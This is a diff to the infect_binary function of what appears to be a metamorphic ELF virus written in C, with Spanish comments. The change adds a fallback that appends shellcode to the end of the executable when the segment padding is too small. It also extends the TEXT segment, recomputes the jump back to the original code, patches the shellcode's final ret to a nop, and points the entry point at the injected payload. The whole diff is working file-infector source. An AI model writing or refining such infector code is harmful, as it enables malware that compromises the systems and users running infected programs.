@@ -199,7 +199,7 @@ int infect_binary(const char *filepath)
 		fprintf(stderr, "%02x ", jmp_to_original[i]);
 	fprintf(stderr, "\n");
 
-	// Get signature for injection
+	// Get signature for injection (texto plano, visible con strings)
 	const char *sig = get_signature();
 	size_t sig_len = strlen(sig) + 1;
 
@@ -217,20 +217,41 @@ int infect_binary(const char *filepath)
 	DEBUG_PRINT("  total_injection_size: %zu", total_injection_size);
 	DEBUG_PRINT("  available_padding: %zu", available_padding);
 
-	// VERIFICAR que cabe en el padding existente
-	if (total_injection_size > available_padding) {
-		DEBUG_PRINT("ERROR: No hay suficiente padding! Necesitamos %zu, disponible %zu",
-			total_injection_size, available_padding);
-		cleanup_elf(&elf);
-		return -1;
-	}
-	DEBUG_PRINT("  OK: Shellcode cabe en padding existente");
-
-	// El nuevo archivo tiene EL MISMO TAMAÑO - solo sobrescribimos el padding
-	new_size = original_size;
+	// Decidir estrategia: padding o extender archivo
+	int use_padding = (total_injection_size <= available_padding);
 	
-	DEBUG_PRINT("  payload_file_offset (punto de inyeccion): 0x%lx", (unsigned long)payload_file_offset);
-	DEBUG_PRINT("  new_size = original_size = %zu (SIN CAMBIOS)", new_size);
+	if (use_padding) {
+		DEBUG_PRINT("  ESTRATEGIA: Usar padding existente");
+		new_size = original_size;
+	} else {
+		DEBUG_PRINT("  ESTRATEGIA: Extender archivo al final");
+		// Inyectar al final del archivo, extendiendo el segmento TEXT
+		payload_file_offset = original_size;
+		payload_vaddr = payload_file_offset + vaddr_offset_diff;
+		new_size = original_size + total_injection_size;
+		
+		// Recalcular JMP con nueva posición
+		jmp_from = payload_vaddr + METAMORPH_SHELLCODE_SIZE;
+		rel_offset = (int64_t)(jmp_to - (jmp_from + 5));
+		
+		if (rel_offset >= INT32_MIN && rel_offset <= INT32_MAX) {
+			jmp_to_original[0] = 0xE9;
+			*(int32_t *)(&jmp_to_original[1]) = (int32_t)rel_offset;
+			jmp_size = 5;
+		} else {
+			jmp_to_original[0] = 0xFF;
+			jmp_to_original[1] = 0x25;
+			*(uint32_t *)(&jmp_to_original[2]) = 0;
+			*(uint64_t *)(&jmp_to_original[6]) = jmp_to;
+			jmp_size = 14;
+		}
+		
+		DEBUG_PRINT("  Nuevo payload_file_offset: 0x%lx", (unsigned long)payload_file_offset);
+		DEBUG_PRINT("  Nuevo payload_vaddr: 0x%lx", (unsigned long)payload_vaddr);
+	}
+	
+	DEBUG_PRINT("  payload_file_offset: 0x%lx", (unsigned long)payload_file_offset);
+	DEBUG_PRINT("  new_size: %zu", new_size);
 
 	new_data = malloc(new_size);
 	if (!new_data)
@@ -242,18 +263,25 @@ int infect_binary(const char *filepath)
 
 	insert_garbage5();
 
-	// Copiar TODO el archivo original (sin modificar tamaño)
+	// Copiar archivo original
 	memcpy(new_data, elf.data, original_size);
-	DEBUG_PRINT("Copiado archivo original completo (%zu bytes)", original_size);
+	DEBUG_PRINT("Copiado archivo original (%zu bytes)", original_size);
 
-	// SOBRESCRIBIR el padding con nuestro shellcode (no insertar, solo sobrescribir)
+	// Escribir shellcode en la posición calculada
 	memcpy((char *)new_data + payload_file_offset, metamorph_shellcode, METAMORPH_SHELLCODE_SIZE);
-	DEBUG_PRINT("Sobrescrito padding con shellcode (%d bytes) en offset 0x%lx",
+	DEBUG_PRINT("Escrito shellcode (%d bytes) en offset 0x%lx",
 		METAMORPH_SHELLCODE_SIZE, (unsigned long)payload_file_offset);
 
-	// Sobrescribir con jump instruction
+	// PARCHE: Reemplazar el último byte del shellcode (ret = 0xc3) con NOP (0x90)
+	unsigned char *shellcode_end = (unsigned char *)new_data + payload_file_offset + METAMORPH_SHELLCODE_SIZE - 1;
+	if (*shellcode_end == 0xc3) {
+		*shellcode_end = 0x90;
+		DEBUG_PRINT("Parcheado: ret (0xc3) -> nop (0x90)");
+	}
+
+	// Escribir JMP
 	memcpy((char *)new_data + payload_file_offset + METAMORPH_SHELLCODE_SIZE, jmp_to_original, jmp_size);
-	DEBUG_PRINT("Sobrescrito con JMP (%zu bytes) en offset 0x%lx",
+	DEBUG_PRINT("Escrito JMP (%zu bytes) en offset 0x%lx",
 		jmp_size, (unsigned long)(payload_file_offset + METAMORPH_SHELLCODE_SIZE));
 
 	// Sobrescribir con signature
@@ -272,12 +300,11 @@ int infect_binary(const char *filepath)
 	DEBUG_PRINT("--- MODIFICACION DE HEADERS ---");
 	DEBUG_PRINT("  Entry point ANTES: 0x%lx", (unsigned long)new_ehdr->e_entry);
 
-	// Change entry point to shellcode
-	new_ehdr->e_entry = payload_vaddr;
-	DEBUG_PRINT("  Entry point DESPUES: 0x%lx", (unsigned long)new_ehdr->e_entry);
-
-	// NO ajustamos e_shoff ni offsets de segmentos porque no movimos nada
-	DEBUG_PRINT("  (No se ajustan offsets - solo sobrescribimos padding)");
+	// Change entry point to shellcode (+ offset de la función principal)
+	uint64_t shellcode_entry = payload_vaddr + METAMORPH_ENTRY_OFFSET;
+	new_ehdr->e_entry = shellcode_entry;
+	DEBUG_PRINT("  METAMORPH_ENTRY_OFFSET: %d", METAMORPH_ENTRY_OFFSET);
+	DEBUG_PRINT("  Entry point DESPUES: 0x%lx (payload_vaddr + offset)", (unsigned long)new_ehdr->e_entry);
 
 	DEBUG_PRINT("  Segmento[%zu] ANTES de extension: filesz=0x%lx memsz=0x%lx flags=0x%x",
 		text_seg_idx,
@@ -286,9 +313,19 @@ int infect_binary(const char *filepath)
 		new_phdr[text_seg_idx].p_flags);
 
 	// Extender filesz y memsz del segmento TEXT para incluir el payload
-	// TEXT no tiene .bss, así que filesz == memsz siempre
-	new_phdr[text_seg_idx].p_filesz += total_injection_size;
-	new_phdr[text_seg_idx].p_memsz += total_injection_size;
+	if (use_padding) {
+		// Solo extendemos por el tamaño de la inyección dentro del padding
+		new_phdr[text_seg_idx].p_filesz += total_injection_size;
+		new_phdr[text_seg_idx].p_memsz += total_injection_size;
+	} else {
+		// Extendemos hasta el final del archivo (incluyendo lo que había después del segmento)
+		// Usamos new_phdr porque text_seg apuntaba a memoria ya liberada
+		size_t extension = (payload_file_offset + total_injection_size) - 
+		                   (new_phdr[text_seg_idx].p_offset + new_phdr[text_seg_idx].p_filesz);
+		new_phdr[text_seg_idx].p_filesz += extension;
+		new_phdr[text_seg_idx].p_memsz += extension;
+		DEBUG_PRINT("  Extension del segmento: %zu bytes", extension);
+	}
 
 	// TEXT ya es ejecutable, pero verificamos por si acaso
 	if (!(new_phdr[text_seg_idx].p_flags & PF_X))
